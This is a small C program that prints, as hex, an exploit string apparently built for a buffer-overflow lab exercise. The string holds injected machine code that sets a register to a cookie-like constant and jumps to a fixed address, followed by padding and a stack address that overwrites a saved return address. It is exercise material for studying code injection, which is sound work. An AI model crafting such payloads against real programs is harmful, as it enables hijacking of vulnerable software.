#include <stdio.h>
#include <string.h>

/*
00000000 <.text>:
   0:   b8 38 c5 1c 33          mov    $0x331cc538,%eax
   5:   68 1e 90 04 08          push   $0x804901e
   a:   c3                      ret
*/

char out[] = {0xb8, 0x38, 0xc5, 0x1c,
              0x33, 0x68, 0x1e, 0x90,
              0x04, 0x08, 0xc3, 0x00,
              0x08, 0xb8, 0xff, 0xff, 
              //0xffffb7dc
              0xdc, 0xb7, 0xff, 0xff,
              0x00};

int out2[] = {0xb8, 0x38, 0xc5, 0x1c,
              0x33, 0x68, 0x1e, 0x90,
              0x04, 0x08, 0xc3, 0x00,
              0x08, 0xb8, 0xff, 0xff, 
              //0xffffb7dc
              0xdc, 0xb7, 0xff, 0xff};

int main() {
    int len = 20;
    for (int i = 0; i < len - 1; i++) {
        if (out2[i] < 16) {
            printf("0");
        }
        printf("%x ", out2[i]);
    }
    if (out2[len - 1] < 16) {
            printf("0");
    }
    printf("%x", out2[len - 1]);
    return 0;
}